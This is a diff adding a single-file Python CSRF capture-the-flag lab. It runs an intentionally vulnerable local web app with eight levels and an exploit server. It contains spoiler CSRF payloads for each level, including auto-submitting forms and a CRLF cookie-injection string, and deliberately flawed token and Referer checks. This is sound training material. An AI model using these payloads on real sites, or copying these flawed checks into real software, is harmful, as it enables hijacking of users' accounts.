@@ -1,0 +1,347 @@
+
+"""
+CSRF CTF LAB  -  single file, standard library only (Python 3.8+)
+
+Run:      python3 csrf_ctf_lab.py
+Then open http://localhost:8000  (the vulnerable app)
+          http://localhost:9000  (your exploit server)
+
+Accounts (same on every level):
+    wiener : peter      <- YOU (the attacker)
+    carlos : montoya    <- the VICTIM (log in as carlos in a 2nd browser / private window,
+                           then open your exploit page there)
+
+GOAL on every level: make *carlos's* email become  something@evil-user.net
+using a CSRF exploit hosted on the exploit server.  The flag shows up on the
+scoreboard (http://localhost:8000) once carlos's email is changed.
+
+!!  DELIBERATELY VULNERABLE.  Binds to 127.0.0.1 only.  Never expose it.  !!
+Note: localhost:8000 and localhost:9000 are the same *site*, so this lab does
+not model SameSite cookies - it focuses on token / Referer validation flaws.
+
+Options:  --solutions   print spoiler exploit for each level
+          --lab-port N / --exploit-port N
+"""
+import argparse, hashlib, hmac, html, secrets, sys, threading
+from http.cookies import SimpleCookie
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from urllib.parse import parse_qs, urlparse, unquote
+
+LAB_PORT, EXP_PORT = 8000, 9000
+SECRET = secrets.token_hex(16)
+USERS = {"wiener": "peter", "carlos": "montoya"}
+VICTIM = "carlos"
+LOCK = threading.Lock()
+
+LEVELS = {
+    1: ("No defenses", "Apprentice",
+        "There is no protection at all. Build the classic auto-submitting form.",
+        "<form action=\"{LAB}/l1/my-account/change-email\" method=\"POST\">\n"
+        "  <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\">\n"
+        "</form>\n<script>document.forms[0].submit()</script>"),
+    2: ("Token validated only on POST", "Practitioner",
+        "A CSRF token exists. Does the server check it for every HTTP method?",
+        "<img src=\"{LAB}/l2/my-account/change-email?email=pwned@evil-user.net\">"),
+    3: ("Token validated only if present", "Practitioner",
+        "The token is checked... when it is sent. What if the parameter is missing completely?",
+        "<form action=\"{LAB}/l3/my-account/change-email\" method=\"POST\">\n"
+        "  <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\">\n"
+        "</form>\n<script>document.forms[0].submit()</script>"),
+    4: ("Token not tied to the user session", "Practitioner",
+        "Tokens come from a global pool. Log in as wiener, grab a token, give it to the victim.",
+        "<form action=\"{LAB}/l4/my-account/change-email\" method=\"POST\">\n"
+        "  <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\">\n"
+        "  <input type=\"hidden\" name=\"csrf\" value=\"WIENER_TOKEN\">\n"
+        "</form>\n<script>document.forms[0].submit()</script>"),
+    5: ("Token tied to a non-session cookie", "Practitioner",
+        "Token is bound to the 'csrfKey' cookie, not the session. Is there any way to set a cookie "
+        "in the victim's browser? (look at the search feature: /l5/search?term=x)",
+        "<img src=\"{LAB}/l5/search?term=x%0d%0aSet-Cookie:%20csrfKey=WIENER_KEY%3b%20Path=/l5/\"\n"
+        "     onerror=\"document.forms[0].submit()\">\n"
+        "<form action=\"{LAB}/l5/my-account/change-email\" method=\"POST\">\n"
+        "  <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\">\n"
+        "  <input type=\"hidden\" name=\"csrf\" value=\"WIENER_TOKEN\">\n</form>"),
+    6: ("Token duplicated in a cookie (double submit)", "Practitioner",
+        "The server only checks that the 'csrf' cookie equals the 'csrf' parameter. "
+        "You can invent the value - you just need a cookie-setting gadget (/l6/search).",
+        "<img src=\"{LAB}/l6/search?term=x%0d%0aSet-Cookie:%20csrf=fake123%3b%20Path=/l6/\"\n"
+        "     onerror=\"document.forms[0].submit()\">\n"
+        "<form action=\"{LAB}/l6/my-account/change-email\" method=\"POST\">\n"
+        "  <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\">\n"
+        "  <input type=\"hidden\" name=\"csrf\" value=\"fake123\">\n</form>"),
+    7: ("Referer validated only if present", "Practitioner",
+        "The app checks the Referer header, but only when the browser sends one.",
+        "<meta name=\"referrer\" content=\"never\">\n"
+        "<form action=\"{LAB}/l7/my-account/change-email\" method=\"POST\">\n"
+        "  <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\">\n"
+        "</form>\n<script>document.forms[0].submit()</script>"),
+    8: ("Broken Referer validation", "Practitioner",
+        "The Referer only has to *contain* the lab host. Browsers strip query strings from the "
+        "Referer by default - think about the Referrer-Policy response header on your exploit.",
+        "HEAD:  Referrer-Policy: unsafe-url\n"
+        "BODY:\n<form action=\"{LAB}/l8/my-account/change-email\" method=\"POST\">\n"
+        "  <input type=\"hidden\" name=\"email\" value=\"pwned@evil-user.net\">\n</form>\n"
+        "<script>\n  history.pushState('', '', '/?{HOST}');\n  document.forms[0].submit();\n</script>"),
+}
+
+# ----------------------------------------------------------------- state ---
+SESS = {}            # level -> {sid: {"user":..,"csrf":..}}
+EMAILS = {}          # level -> {user: email}
+POOL = {n: set() for n in LEVELS}     # L4 global token pool
+KEYMAP = {n: {} for n in LEVELS}      # L5 csrfKey cookie -> token
+for n in LEVELS:
+    SESS[n] = {}
+    EMAILS[n] = {"wiener": "wiener@normal-user.com", "carlos": "carlos@carlos-montoya.net"}
+
+def flag(n):
+    return "FLAG{csrf_l%d_%s}" % (n, hmac.new(SECRET.encode(), str(n).encode(), hashlib.sha256).hexdigest()[:12])
+
+def solved(n):
+    return EMAILS[n][VICTIM].lower().endswith("@evil-user.net")
+
+CSS = ("body{font-family:system-ui,sans-serif;background:#0f1419;color:#e6e6e6;max-width:820px;margin:30px auto;padding:0 16px}"
+       "a{color:#5ac8fa}input,textarea,button{font:inherit;padding:8px;margin:4px 0;border-radius:6px;border:1px solid #333;"
+       "background:#1a2027;color:#eee}button{background:#e8590c;border:0;cursor:pointer}textarea{width:100%;font-family:monospace}"
+       "table{border-collapse:collapse;width:100%}td,th{border-bottom:1px solid #2a323b;padding:8px;text-align:left}"
+       ".ok{color:#51cf66}.no{color:#ff6b6b}.box{background:#1a2027;padding:12px;border-radius:8px;margin:12px 0}"
+       "code,pre{background:#1a2027;padding:2px 6px;border-radius:4px}")
+
+def page(title, body):
+    return ("<!doctype html><meta charset=utf-8><title>%s</title><style>%s</style>%s" % (html.escape(title), CSS, body)).encode()
+
+# ------------------------------------------------------------- lab server ---
+class Lab(BaseHTTPRequestHandler):
+    server_version = "VulnLab/1.0"
+    def log_message(self, *a): pass
+
+    # --- helpers
+    def send(self, code=200, body=b"", headers=None, ctype="text/html; charset=utf-8"):
+        self.send_response(code)
+        self.send_header("Content-Type", ctype)
+        self.send_header("Content-Length", str(len(body)))
+        for k, v in (headers or []):
+            self.send_header(k, v)      # NOT sanitised on purpose (header-injection gadget, L5/L6)
+        self.end_headers()
+        self.wfile.write(body)
+
+    def redirect(self, to, headers=None):
+        self.send(302, b"", [("Location", to)] + (headers or []))
+
+    def cookies(self):
+        c = SimpleCookie(); c.load(self.headers.get("Cookie", ""))
+        return {k: v.value for k, v in c.items()}
+
+    def body_params(self):
+        n = int(self.headers.get("Content-Length") or 0)
+        raw = self.rfile.read(n).decode("utf-8", "replace") if n else ""
+        return {k: v[0] for k, v in parse_qs(raw, keep_blank_values=True).items()}
+
+    def session(self, n):
+        sid = self.cookies().get("session")
+        return sid, SESS[n].get(sid)
+
+    # --- routing
+    def do_GET(self): self.route("GET")
+    def do_POST(self): self.route("POST")
+
+    def route(self, method):
+        u = urlparse(self.path)
+        path = u.path
+        query = {k: v[0] for k, v in parse_qs(u.query, keep_blank_values=True).items()}
+        if path == "/":
+            return self.home()
+        parts = path.strip("/").split("/", 1)
+        if parts[0].startswith("l") and parts[0][1:].isdigit() and int(parts[0][1:]) in LEVELS:
+            n = int(parts[0][1:]); sub = "/" + (parts[1] if len(parts) > 1 else "")
+            return self.level(n, sub, method, query)
+        self.send(404, page("404", "<h1>404</h1>"))
+
+    # --- pages
+    def home(self):
+        rows = ""
+        for n, (name, diff, hint, _) in LEVELS.items():
+            ok = solved(n)
+            rows += ("<tr><td>%d</td><td><a href='/l%d/login'>%s</a></td><td>%s</td><td class='%s'>%s</td></tr>"
+                     % (n, n, html.escape(name), diff, "ok" if ok else "no",
+                        "SOLVED &mdash; <code>%s</code>" % flag(n) if ok else "not solved"))
+        body = ("<h1>&#128737; CSRF CTF Lab</h1>"
+                "<div class=box>Attacker: <code>wiener / peter</code> &nbsp; Victim: <code>carlos / montoya</code><br>"
+                "Exploit server: <a href='http://localhost:%d' target=_blank>http://localhost:%d</a><br>"
+                "Goal: change <b>carlos's</b> email to <code>*@evil-user.net</code> with a CSRF exploit.</div>"
+                "<table><tr><th>#</th><th>Level</th><th>Difficulty</th><th>Status</th></tr>%s</table>"
+                "<p><a href='/reset'>reset all levels</a></p>" % (EXP_PORT, EXP_PORT, rows))
+        self.send(200, page("CSRF CTF Lab", body))
+
+    def level(self, n, sub, method, query):
+        name, diff, hint, _ = LEVELS[n]
+        base = "/l%d" % n
+        sid, sess = self.session(n)
+        if sub == "/login":
+            return self.login(n, method)
+        if sub == "/logout":
+            return self.redirect(base + "/login", [("Set-Cookie", "session=; Path=%s/; Max-Age=0" % base)])
+        if sub == "/search" and n in (5, 6):
+            term = unquote(query.get("term", ""))
+            # VULNERABLE GADGET: header injection -> attacker can set arbitrary cookies
+            return self.send(200, page("Search", "<p>Search for <code>%s</code> done. <a href='%s/my-account'>back</a></p>"
+                             % (html.escape(term), base)), [("Set-Cookie", "LastSearchTerm=%s; Path=%s/" % (term, base))])
+        if not sess:
+            return self.redirect(base + "/login")
+        if sub == "/my-account":
+            return self.account(n, sess)
+        if sub == "/my-account/change-email":
+            return self.change_email(n, sess, method, query)
+        self.send(404, page("404", "<h1>404</h1>"))
+
+    def login(self, n, method):
+        base = "/l%d" % n; name, diff, hint, _ = LEVELS[n]
+        if method == "POST":
+            p = self.body_params()
+            if USERS.get(p.get("username")) == p.get("password"):
+                sid = secrets.token_hex(16)
+                SESS[n][sid] = {"user": p["username"], "csrf": secrets.token_hex(16)}
+                return self.redirect(base + "/my-account",
+                                     [("Set-Cookie", "session=%s; Path=%s/; HttpOnly" % (sid, base))])
+            return self.send(200, page("Login", "<p class=no>Invalid login.</p><a href='%s/login'>retry</a>" % base))
+        body = ("<h1>Level %d &mdash; %s</h1><p><i>%s</i></p><div class=box>&#128161; Hint: %s</div>"
+                "<form method=POST><input name=username placeholder=username><br>"
+                "<input name=password type=password placeholder=password><br><button>Log in</button></form>"
+                "<p><a href='/'>&larr; scoreboard</a></p>" % (n, html.escape(name), diff, html.escape(hint)))
+        self.send(200, page("Level %d" % n, body))
+
+    def new_token(self, n, sess):
+        """Return (token, extra_set_cookie_headers) according to the level's design."""
+        extra = []
+        if n == 4:                      # global pool
+            t = secrets.token_hex(16); POOL[n].add(t); return t, extra
+        if n == 5:                      # token bound to csrfKey cookie
+            key = self.cookies().get("csrfKey") or secrets.token_hex(8)
+            t = secrets.token_hex(16); KEYMAP[n][key] = t
+            extra.append(("Set-Cookie", "csrfKey=%s; Path=/l5/" % key)); return t, extra
+        if n == 6:                      # double submit
+            t = secrets.token_hex(16)
+            extra.append(("Set-Cookie", "csrf=%s; Path=/l6/" % t)); return t, extra
+        return sess["csrf"], extra      # levels 2,3 : per-session token
+
+    def account(self, n, sess):
+        base = "/l%d" % n; user = sess["user"]; email = EMAILS[n][user]
+        tok_field, extra = "", []
+        if n in (2, 3, 4, 5, 6):
+            t, extra = self.new_token(n, sess)
+            tok_field = "<input type=hidden name=csrf value='%s'>" % t
+        fl = ""
+        if user == VICTIM and solved(n):
+            fl = "<div class=box>&#127881; <b>%s</b></div>" % flag(n)
+        body = ("<h1>Level %d &mdash; My account</h1><p>Logged in as <b>%s</b> &nbsp; <a href='%s/logout'>log out</a></p>"
+                "<p>Email: <code>%s</code></p>%s"
+                "<form method=POST action='%s/my-account/change-email'><input name=email type=email value='%s'>%s"
+                "<button>Update email</button></form><p><a href='/'>&larr; scoreboard</a></p>"
+                % (n, html.escape(user), base, html.escape(email), fl, base, html.escape(email), tok_field))
+        self.send(200, page("My account", body), extra)
+
+    def change_email(self, n, sess, method, query):
+        user = sess["user"]
+        params = dict(query) if method == "GET" else self.body_params()
+        # ---- method rules
+        if method == "GET" and n != 2:
+            return self.send(405, page("405", "<h1>Method not allowed</h1>"))
+        # ---- per-level defenses
+        if n in (2, 3, 4, 5, 6) and not (n == 2 and method == "GET"):
+            tok = params.get("csrf")
+            if n == 3 and tok is None:
+                pass                                           # VULN: skipped when absent
+            else:
+                ok = False
+                if n in (2, 3): ok = tok == sess["csrf"]
+                elif n == 4:    ok = tok in POOL[n]            # VULN: not tied to session
+                elif n == 5:    ok = tok is not None and KEYMAP[n].get(self.cookies().get("csrfKey")) == tok  # VULN: csrfKey != session
+                elif n == 6:    ok = bool(tok) and tok == self.cookies().get("csrf")                           # VULN: double submit
+                if not ok:
+                    return self.send(403, page("403", "<h1>403</h1><p>Invalid CSRF token</p>"))
+        ref = self.headers.get("Referer")
+        host = "localhost:%d" % LAB_PORT
+        if n == 7 and ref is not None and urlparse(ref).netloc != host:       # VULN: only if present
+            return self.send(403, page("403", "<h1>403</h1><p>Invalid Referer</p>"))
+        if n == 8 and (ref is None or host not in ref):                        # VULN: substring match
+            return self.send(403, page("403", "<h1>403</h1><p>Invalid Referer</p>"))
+        new = params.get("email", "").strip()
+        if "@" not in new:
+            return self.send(400, page("400", "<h1>Bad email</h1>"))
+        with LOCK:
+            EMAILS[n][user] = new
+        self.redirect("/l%d/my-account" % n)
+
+    def do_reset(self):
+        for n in LEVELS:
+            EMAILS[n].update({"wiener": "wiener@normal-user.com", "carlos": "carlos@carlos-montoya.net"})
+            SESS[n].clear(); POOL[n].clear(); KEYMAP[n].clear()
+
+# add /reset route
+_orig_route = Lab.route
+def _route(self, method):
+    if urlparse(self.path).path == "/reset":
+        self.do_reset(); return self.redirect("/")
+    return _orig_route(self, method)
+Lab.route = _route
+
+# ---------------------------------------------------------- exploit server ---
+EXPLOIT = {"head": "Content-Type: text/html; charset=utf-8", "body": "<h1>Hello, attacker!</h1>"}
+ACCESS = []
+
+class Exploit(BaseHTTPRequestHandler):
+    server_version = "ExploitServer/1.0"
+    def log_message(self, *a): pass
+    def do_GET(self):
+        path = urlparse(self.path).path
+        if path == "/exploit":
+            ACCESS.append("%s %s  Referer-of-victim-request: %s" % (self.client_address[0], self.path, self.headers.get("Referer")))
+            self.send_response(200)
+            for line in EXPLOIT["head"].splitlines():
+                if ":" in line:
+                    k, v = line.split(":", 1); self.send_header(k.strip(), v.strip())
+            raw = EXPLOIT["body"].encode()
+            if not any(l.lower().startswith("content-type") for l in EXPLOIT["head"].splitlines()):
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(raw))); self.end_headers(); self.wfile.write(raw)
+            return
+        log = "\n".join(html.escape(a) for a in ACCESS[-15:]) or "(no hits yet)"
+        body = ("<h1>&#128126; Exploit server</h1>"
+                "<p>Lab: <a href='http://localhost:%d' target=_blank>http://localhost:%d</a> &nbsp;|&nbsp; "
+                "Your exploit URL: <a href='/exploit' target=_blank>http://localhost:%d/exploit</a></p>"
+                "<form method=POST><b>Response head</b> (one header per line)<br>"
+                "<textarea name=head rows=3>%s</textarea><br><b>Response body</b><br>"
+                "<textarea name=body rows=16>%s</textarea><br><button>Store</button></form>"
+                "<h3>Access log</h3><pre>%s</pre>"
+                % (LAB_PORT, LAB_PORT, EXP_PORT, html.escape(EXPLOIT["head"]), html.escape(EXPLOIT["body"]), log))
+        raw = page("Exploit server", body)
+        self.send_response(200); self.send_header("Content-Type", "text/html; charset=utf-8")
+        self.send_header("Content-Length", str(len(raw))); self.end_headers(); self.wfile.write(raw)
+    def do_POST(self):
+        n = int(self.headers.get("Content-Length") or 0)
+        p = {k: v[0] for k, v in parse_qs(self.rfile.read(n).decode("utf-8", "replace"), keep_blank_values=True).items()}
+        EXPLOIT["head"] = p.get("head", "").replace("\r", ""); EXPLOIT["body"] = p.get("body", "")
+        self.send_response(302); self.send_header("Location", "/"); self.send_header("Content-Length", "0"); self.end_headers()
+
+# -------------------------------------------------------------------- main ---
+def main():
+    global LAB_PORT, EXP_PORT
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--solutions", action="store_true"); ap.add_argument("--lab-port", type=int, default=8000)
+    ap.add_argument("--exploit-port", type=int, default=9000)
+    a = ap.parse_args(); LAB_PORT, EXP_PORT = a.lab_port, a.exploit_port
+    if a.solutions:
+        for n, (name, _, _, sol) in LEVELS.items():
+            print("\n=== Level %d: %s ===\n%s" % (n, name, sol.replace("{LAB}", "http://localhost:%d" % LAB_PORT).replace("{HOST}", "localhost:%d" % LAB_PORT)))
+        return
+    for port, h in ((LAB_PORT, Lab), (EXP_PORT, Exploit)):
+        srv = ThreadingHTTPServer(("127.0.0.1", port), h)
+        threading.Thread(target=srv.serve_forever, daemon=True).start()
+    print("CSRF CTF LAB running (127.0.0.1 only)\n  Lab:     http://localhost:%d\n  Exploit: http://localhost:%d\n"
+          "Ctrl+C to stop.  Spoilers: python3 %s --solutions" % (LAB_PORT, EXP_PORT, sys.argv[0]))
+    try:
+        threading.Event().wait()
+    except KeyboardInterrupt:
+        pass
+
+if __name__ == "__main__":
+    main()
